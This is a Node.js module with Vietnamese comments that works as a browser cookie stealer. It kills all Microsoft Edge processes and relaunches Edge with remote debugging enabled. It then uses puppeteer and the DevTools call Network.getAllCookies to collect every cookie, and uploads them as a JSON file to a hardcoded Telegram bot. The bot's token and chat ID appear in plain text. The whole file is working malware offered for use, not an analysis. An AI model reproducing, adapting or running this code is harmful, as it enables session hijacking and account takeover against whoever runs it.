// readEdgeCookies.js
const { exec, spawn } = require('child_process');
const puppeteer = require('puppeteer-core');
const https = require('https');
const { Readable } = require('stream');

// Thông tin Telegram
const TELEGRAM_BOT_TOKEN = '8268575626:AAF-azWchMAmpAFFxGvRK63jSFIbWVm2KVY';
const TELEGRAM_CHAT_ID = '5741883868';

// ✅ Thêm flag để tránh gọi nhiều lần cùng lúc
let isProcessing = false;
let edgeProcess = null;

function sendFileToTelegram(cookiesData, fileName) {
  return new Promise((resolve, reject) => {
    const FormData = require('form-data');
    const form = new FormData();
    
    // ✅ Tạo stream từ JSON data thay vì đọc file
    const jsonString = JSON.stringify(cookiesData, null, 2);
    const stream = Readable.from([jsonString]);
    
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', stream, {
      filename: fileName,
      contentType: 'application/json'
    });
    form.append('caption', `🍪 Cookies từ Edge browser\n📁 ${fileName}\n📊 Tổng: ${cookiesData.length} cookies`);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
      method: 'POST',
      headers: form.getHeaders()
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        console.log('📡 Telegram response status:', res.statusCode);
        console.log('📡 Telegram response:', data);
        
        if (res.statusCode === 200) {
          try {
            const parsed = JSON.parse(data);
            if (parsed.ok) {
              resolve(parsed);
            } else {
              reject(new Error(`Telegram API error: ${parsed.description || data}`));
            }
          } catch (e) {
            reject(new Error(`Parse error: ${e.message}, data: ${data}`));
          }
        } else {
          reject(new Error(`HTTP ${res.statusCode}: ${data}`));
        }
      });
    });

    req.on('error', (err) => {
      console.error('❌ Request error:', err);
      reject(err);
    });

    form.on('error', (err) => {
      console.error('❌ Form error:', err);
      reject(err);
    });

    form.pipe(req);
  });
}

function sendMessageToTelegram(text) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    };

    const req = https.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => { responseData += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          resolve(JSON.parse(responseData));
        } else {
          reject(new Error(`Telegram API error: ${responseData}`));
        }
      });
    });

    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ✅ Kiểm tra Edge có đang chạy với remote debugging không
async function checkRemoteDebugging() {
  try {
    const browser = await puppeteer.connect({
      browserURL: 'http://localhost:9222',
      defaultViewport: null,
      timeout: 2000
    });
    console.log('✅ Edge đã có remote debugging');
    return browser;
  } catch (err) {
    console.log('⚠️ Edge chưa có remote debugging');
    return null;
  }
}

// ✅ Kill tất cả Edge processes
function killAllEdge() {
  return new Promise((resolve) => {
    console.log('🔴 Đang đóng tất cả Edge...');
    exec('taskkill /F /IM msedge.exe /T', (err) => {
      if (err) {
        console.log('⚠️ Không có Edge nào đang chạy hoặc lỗi kill:', err.message);
      } else {
        console.log('✅ Đã đóng Edge');
      }
      // Đợi 3 giây để Edge đóng hoàn toàn
      setTimeout(resolve, 3000);
    });
  });
}

// ✅ Khởi động Edge với remote debugging
function startEdgeWithDebugging() {
  return new Promise((resolve, reject) => {
    const fs = require('fs');
    const edgePath1 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    const edgePath2 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
    
    let executablePath;
    if (fs.existsSync(edgePath2)) {
      executablePath = edgePath2;
    } else if (fs.existsSync(edgePath1)) {
      executablePath = edgePath1;
    } else {
      return reject(new Error('Không tìm thấy Edge executable'));
    }

    console.log('🚀 Khởi động Edge với remote debugging...');
    console.log('📂 Path:', executablePath);
    
    // ✅ Sử dụng spawn thay vì exec để không bị block
    edgeProcess = spawn(executablePath, [
      '--remote-debugging-port=9222',
      '--no-first-run',
      '--no-default-browser-check'
    ], {
      detached: true,
      stdio: 'ignore'
    });

    edgeProcess.unref(); // Cho phép process chạy độc lập

    console.log('⏳ Đợi Edge khởi động (7 giây)...');
    
    // Đợi 7 giây để Edge khởi động hoàn toàn
    setTimeout(() => {
      console.log('✅ Edge đã sẵn sàng');
      resolve();
    }, 7000);
  });
}

// ✅ Retry connect với timeout
async function connectWithRetry(maxRetries = 5) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      console.log(`🔄 Thử connect lần ${i + 1}/${maxRetries}...`);
      const browser = await puppeteer.connect({
        browserURL: 'http://localhost:9222',
        defaultViewport: null,
        timeout: 5000
      });
      console.log('✅ Connect thành công!');
      return browser;
    } catch (err) {
      console.log(`❌ Lần ${i + 1} thất bại:`, err.message);
      if (i < maxRetries - 1) {
        console.log('⏳ Đợi 2 giây trước khi thử lại...');
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
  }
  throw new Error('Không thể kết nối Edge sau nhiều lần thử');
}

async function getCookiesAndSendTelegram() {
  // ✅ Kiểm tra đang xử lý
  if (isProcessing) {
    console.log('⏳ Đang xử lý request khác, skip...');
    return { success: false, message: 'Already processing' };
  }

  isProcessing = true;
  let browser = null;

  try {
    console.log('🔍 Bắt đầu lấy cookies...');
    await sendMessageToTelegram('🔍 Bắt đầu lấy cookies từ Edge...');
    
    // ✅ Bước 1: Kiểm tra Edge có remote debugging chưa
    browser = await checkRemoteDebugging();
    
    // ✅ Bước 2: Nếu chưa có, restart Edge
    if (!browser) {
      console.log('🔄 Edge chưa có remote debugging, đang restart...');
      await sendMessageToTelegram('🔄 Đang khởi động lại Edge...');
      
      await killAllEdge();
      await startEdgeWithDebugging();
      
      // ✅ Bước 3: Thử connect với retry
      browser = await connectWithRetry();
    }

    console.log('✅ Đã kết nối tới Edge');

    // ✅ Đợi thêm 2 giây để Edge load xong
    console.log('⏳ Đợi Edge load hoàn toàn...');
    await new Promise(resolve => setTimeout(resolve, 2000));

    const pages = await browser.pages();
    console.log(`📄 Tìm thấy ${pages.length} tabs`);
    
    // ✅ Nếu không có tab, tạo tab mới
    let page;
    if (pages.length === 0) {
      console.log('📄 Tạo tab mới...');
      page = await browser.newPage();
      await page.goto('about:blank');
    } else {
      page = pages[0];
    }

    const client = await page.target().createCDPSession();

    const { cookies } = await client.send('Network.getAllCookies');
    console.log(`✅ Tổng cookies: ${cookies.length}`);
    
    if (cookies.length === 0) {
      await sendMessageToTelegram('⚠️ Không có cookies nào! (Edge mới khởi động, chưa đăng nhập)');
      await browser.disconnect();
      isProcessing = false;
      return { success: true, cookieCount: 0, message: 'No cookies yet' };
    }

    // ✅ Tạo tên file
    const fileName = `edge_cookies_${Date.now()}.json`;
    
    // ✅ Tính size (ước lượng)
    const jsonString = JSON.stringify(cookies, null, 2);
    const sizeKB = (Buffer.byteLength(jsonString, 'utf8') / 1024).toFixed(2);
    
    console.log(`📦 Data size: ${sizeKB} KB`);
    console.log('📤 Đang gửi cookies lên Telegram...');
    
    // ✅ Gửi trực tiếp từ memory, không qua file
    await sendFileToTelegram(cookies, fileName);
    console.log('✅ Đã gửi file thành công!');
    
    const summary = `✅ <b>Hoàn thành!</b>\n\n` +
                   `🍪 Tổng cookies: <b>${cookies.length}</b>\n` +
                   `📁 File: ${fileName}\n` +
                   `📦 Size: ${sizeKB} KB\n` +
                   `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`;
    
    await sendMessageToTelegram(summary);
    console.log('✅ Đã gửi summary lên Telegram!');

    await browser.disconnect();
    console.log('✅ Hoàn thành! Edge vẫn đang chạy.');
    
    isProcessing = false;
    return { success: true, cookieCount: cookies.length };

  } catch (err) {
    console.error('❌ Lỗi:', err.message);
    console.error('❌ Stack:', err.stack);
    
    try {
      await sendMessageToTelegram(`❌ <b>Lỗi:</b> ${err.message}`);
    } catch (teleErr) {
      console.error('❌ Không gửi được thông báo lỗi lên Telegram:', teleErr.message);
    }
    
    isProcessing = false;
    throw err;
  } finally {
    // ✅ Đảm bảo disconnect browser
    if (browser) {
      try {
        await browser.disconnect();
      } catch (e) {
        console.log('⚠️ Lỗi disconnect browser:', e.message);
      }
    }
  }
}

module.exports = { getCookiesAndSendTelegram };